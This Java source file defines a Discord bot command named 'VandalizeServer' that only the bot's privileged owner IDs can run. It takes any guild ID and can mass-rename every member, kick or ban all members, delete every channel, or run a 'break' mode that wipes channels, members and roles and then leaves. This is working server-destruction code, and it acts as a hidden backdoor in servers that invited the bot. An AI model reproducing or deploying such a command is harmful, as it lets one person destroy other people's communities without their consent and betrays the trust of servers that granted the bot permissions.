package com.safjnest.Commands.Dangerous;

import java.util.concurrent.TimeUnit;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import com.safjnest.Utilities.CommandsHandler;
import com.safjnest.Utilities.PermissionHandler;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.exceptions.ErrorHandler;
import net.dv8tion.jda.api.requests.ErrorResponse;

public class VandalizeServer extends Command{

    public VandalizeServer(){
        this.name = this.getClass().getSimpleName();
        this.aliases = new CommandsHandler().getArray(this.name, "alias");
        this.help = new CommandsHandler().getString(this.name, "help");
        this.cooldown = new CommandsHandler().getCooldown(this.name);
        this.category = new Category(new CommandsHandler().getString(this.name, "category"));
        this.arguments = new CommandsHandler().getString(this.name, "arguments");
    }

    @Override
    protected void execute(CommandEvent event) {
        if(!PermissionHandler.isUntouchable(event.getAuthor().getId())){
            return;
        }

        String[] args = event.getArgs().split(" ", 3);
        Guild theGuild = event.getJDA().getGuildById(args[0]);
        Member self = theGuild.getMember(event.getSelfUser());

        

        switch (args[1]) {
            case "suffix":
                String suffix = args[2];
                theGuild.getMembers().forEach(member -> {
                    if(self.canInteract(member) && !((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).toLowerCase().endsWith(suffix.toLowerCase())){
                        member.modifyNickname(((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()) + suffix).queue(
                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                        );
                    }
                });
                System.out.println("all done");
                break;

            case "desuffix":
                String desuffix = args[2];
                theGuild.getMembers().forEach(member -> {
                    if(self.canInteract(member) && ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).toLowerCase().endsWith(desuffix.toLowerCase())){
                        member.modifyNickname(((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).substring(0, ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).length()- desuffix.length())).queue(
                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                        );
                    }
                });
                System.out.println("all done");
                break;

            case "kick":
                theGuild.getMembers().forEach(member -> {
                    if(self.canInteract(member)){
                        member.kick().queue(
                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no -  " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                        );
                    }
                });
                System.out.println("all done");
                break;

            case "ban":
                String reason = args[2];
                theGuild.getMembers().forEach(member -> {
                    if(self.canInteract(member)){
                        member.ban(7,TimeUnit.SECONDS ).reason(reason).queue(
                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                        );
                    }
                });
                System.out.println("all done");
                break;

            case "channel":
                theGuild.getChannels().forEach(channel -> {
                    channel.delete().queue(
                    (e) -> System.out.println("ok - " + channel.getName()), 
                    new ErrorHandler().handle(
                        ErrorResponse.MISSING_PERMISSIONS,
                            (e) -> System.out.println("no - " + channel.getName()))
                    );
                });
                System.out.println("all done");
                break;

            case "break":
                theGuild.getChannels().forEach(channel -> {
                    channel.delete().queue(
                        (e) -> System.out.println("ok - " + channel.getName()), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                            (e) -> System.out.println("no - " + channel.getName()))
                            );
                        });
                        System.out.println("channels deleted");
                        
                theGuild.getMembers().forEach(member -> {
                    if(self.canInteract(member)){
                        member.ban(7, TimeUnit.SECONDS).queue(
                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                        );
                    }
                });
                System.out.println("members banned");
                theGuild.getRoles().forEach(role -> {
                    if(self.canInteract(role)){
                        role.delete().queue(
                        (e) -> System.out.println("ok - " + role.getName()),
                        new ErrorHandler().handle(
                            ErrorResponse.MISSING_PERMISSIONS,
                                (e) -> System.out.println("no - " + role.getName()))
                        );
                    }
                });
                System.out.println("roles deleted");


                theGuild.leave().queue();
                System.out.println("all done");
                break;

            case "escape":
                theGuild.leave().queue();
                break;
        
            default:
                event.reply("idk");
                break;
        }
    }
}